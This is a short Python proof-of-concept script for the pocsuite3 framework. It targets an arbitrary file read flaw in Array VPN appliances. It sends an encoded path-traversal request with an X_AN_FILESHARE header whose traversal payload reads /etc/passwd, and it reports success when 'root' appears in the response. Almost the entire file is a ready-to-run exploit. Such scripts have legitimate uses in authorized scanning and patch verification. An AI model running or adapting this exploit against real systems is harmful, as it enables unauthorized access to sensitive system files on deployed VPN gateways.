# _*_ coding:utf-8 _*_
# @Time : 2023/11/23 20:56
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class ArrayVPNFileRead(POCBase):
    pocDesc = ''' Array VPN 任意文件读取漏洞 '''
    vulID = '1'
    version = '1.0'
    author = '公众号网络安全透视镜'
    vulDate = '2023-11-23'
    createDate = '2023-11-23'
    updateDate = '2023-11-23'
    name = 'Array VPN 任意文件读取漏洞'
    appName = 'Array VPN'



    def _verify(self):

        result = {}
        path = """/prx/000/http/localhost/client_sec/%25%30%30%2e%2e%2f%2e%2e%2f%2e%2e%2f%61%64%64%66%6f%6c%64%65%72"""
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
            "Sec-Fetch-Mode": "no-cors",
            "Sec-Ch-Ua": '"Chromium";v="103", ".Not/A)Brand";v="99"',
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Sec-Fetch-Dest": "script",
            "Sec-Ch-Ua-Platform": "\"Windows\"",
            "Sec-Fetch-Mode": "no-cors",
            "X_AN_FILESHARE": "uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd"
        }
        url = self.url + path
        payload = 'X_AN_FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd'

        try:
            response = requests.get(url, headers=headers,verify=False)
        # 验证成功输出相关信息
            if response.status_code == 401 and 'root' in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Name'] = payload

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(ArrayVPNFileRead)